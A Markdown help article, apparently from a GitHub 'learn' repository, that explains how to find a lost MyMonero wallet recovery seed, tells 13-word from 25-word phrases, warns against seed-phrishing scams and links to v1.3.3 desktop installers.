<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Find Your MyMonero Seed</h1>
<p align="center">Locate the recovery phrase you saved when setting up your wallet.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
Your MyMonero seed is the recovery phrase created when the wallet was set up, not a phrase that can be retrieved from a MyMonero account online. Look for your own private backup; never share the phrase with anyone.

## You'll see this if
- You want to restore a wallet on another device or in another supported wallet.
- You can open the old app but do not remember where you wrote down the seed.
- You have a password but are unsure whether it can reveal the recovery phrase.
- You have a 13-word or 25-word phrase and need to identify the format.
- A stranger offers to locate or validate your seed for you.

## Why it happens
A seed is the wallet recovery information. It should be saved securely when the wallet is created, because a password and a seed serve different purposes. A password protects access to an app installation; the seed is used to recover wallet control. Do not assume that resetting or remembering a password will recreate a missing seed. The available method to retrieve an existing seed from an installation may depend on the app and the situation, so treat recovery as uncertain until you have confirmed what you actually saved.

MyMonero has two seed formats: a MyMonero-specific legacy phrase of 13 words and a standard Monero phrase of 25 words. Keep the original word order and spelling exactly as written. The final desktop release is v1.3.3; the old app still opens wallets and sends XMR but is no longer maintained and has no new features or security updates. MyMonero hosted servers and web wallet login stopped. You can continue with the desktop app or restore the seed in Cake Wallet, which runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See [the seed format comparison](./mymonero-seed-13-vs-25-words.md), [MyMonero desktop release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3), and [wallet recovery overview](./restore-mymonero-wallet.md).

---

## Fix
1. **Search your own records privately.** Check the physical notebook, paper backup, or secure offline record you made during wallet setup. Look in the locations you personally chose—not in email or cloud storage unless that is where you knowingly saved it and can access it safely. Do not send a photograph or copy of the phrase to someone helping you search.
2. **Check whether the old installation still opens.** If you can open the MyMonero desktop app, review its normal wallet and backup options locally. Use only controls presented by the application and consult its included help or the project repository if needed. Do not enter your password or seed into a website claiming to extract it.
3. **Distinguish seed from password and keys.** A password used to open an installation is not necessarily the recovery phrase. A private view key and private spend key are also not the same thing as a seed phrase. Write down what you know without posting it: for example, “I have a password but no written phrase,” or “my paper has 13 entries.” Do not include actual words or key values in a support request.
4. **Count the entries without sharing them.** MyMonero phrases may contain 13 words (legacy, MyMonero-specific) or 25 words (standard Monero). Count your private backup locally, without typing the words into a search engine, online checker, or chat. If you have another number, it may be incomplete, or you may be looking at a different credential.
5. **Preserve the original.** If the paper is damaged or difficult to read, do not guess at uncertain words or reorder entries. Make a private, careful copy of clearly legible information and retain the original. Keep any uncertain parts marked privately; do not ask a stranger to identify them by sending a photo.
6. **Use a recovery route only when prepared.** If you find the full phrase, confirm the intended wallet and understand the restore process before entering it. Cake Wallet is the only other wallet referenced here; check its current supported platform and restore instructions before proceeding. A restore may need a restore height, the block height at which scanning begins. Earlier is safer when uncertain but slower. See [restore height explained](./mymonero-restore-height-explained.md) and [safe seed backup](./mymonero-backup-seed-safely.md).
7. **Take scam precautions.** Do not let anyone remote into your device or ask you to read the phrase aloud. Nobody legitimate asks for your seed. Ignore messages claiming that a seed must be submitted to unlock a balance or synchronize a wallet.

> [!WARNING]
> Anyone who obtains your seed may be able to control the wallet. Never paste it into this conversation, a website, a form, or a support ticket. Use it only in the wallet software you independently chose and trust.

## If that did not work
If no backup turns up, do not assume a hosted service can provide one. MyMonero hosted servers and web wallet login stopped. The old desktop app may still open wallets, but it is no longer maintained. Whether a phrase can be recovered from a particular installation is not confirmed here; do not trust a person who guarantees recovery or demands payment and your credentials.

If the app is still accessible, look for its own local backup or wallet-management options, and take care not to erase the installation before understanding the consequences. Avoid reinstalling, resetting, or deleting wallet data as a first troubleshooting step. Data-folder locations are not specified here, so do not follow generic path instructions unless verified for your system and version. If the app will not open, retain the device and any existing backups while seeking general technical guidance that does not require disclosing secrets.

If you have an incomplete phrase, offline recovery of a missing word is not confirmed. Do not submit partial words to online tools or strangers. Preserve what you have, review your own backup sources, and avoid repeated guesses in unfamiliar software. If you do find a complete phrase, learn [what to do when a seed is not accepted](./mymonero-seed-not-accepted.md) before attempting restore.

## Prevention
Once you have access, create a durable offline backup and verify that you can read it. Keep it private and protected from loss, damage, and unauthorized access. Avoid storing a plain-text copy in email, cloud notes, screenshots, or a shared document. Consider keeping more than one physical backup in secure, separate places, while making sure each copy remains under your control.

Keep seed, password, and private keys clearly distinguished in your own records. Label the wallet and date without including sensitive words on an exposed label. Never enter a seed to “check” a download: software integrity uses a SHA-256 comparison, not wallet secrets. See [safe backup guidance](./mymonero-backup-seed-safely.md), [private view and spend keys](./mymonero-private-view-spend-keys.md), and download verification.

## FAQ
<details><summary>Can MyMonero send my seed to me?</summary>

Do not expect hosted recovery: MyMonero hosted servers and web wallet login stopped. Look for your own secure backup and use the app’s local options only if available.

</details>

<details><summary>Is my app password the seed?</summary>

No. A password for an app installation and a wallet recovery seed are different credentials. Keep both private.

</details>

<details><summary>How many words should my seed have?</summary>

MyMonero uses either a 13-word legacy MyMonero-specific seed or a 25-word standard Monero seed.

</details>

<details><summary>Can support verify my phrase?</summary>

Never share it for verification. Nobody legitimate asks for your seed; enter it only into a wallet you independently chose.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Seed: 13 vs 25 Words](./mymonero-seed-13-vs-25-words.md) | Understand which recovery phrase format you have before restoring. |
| [MyMonero Seed Not Accepted](./mymonero-seed-not-accepted.md) | Check the format and your own backup without exposing recovery words. |
| [MyMonero Lost Seed Word](./mymonero-lost-seed-word.md) | Protect what remains of your backup and avoid risky guesses. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
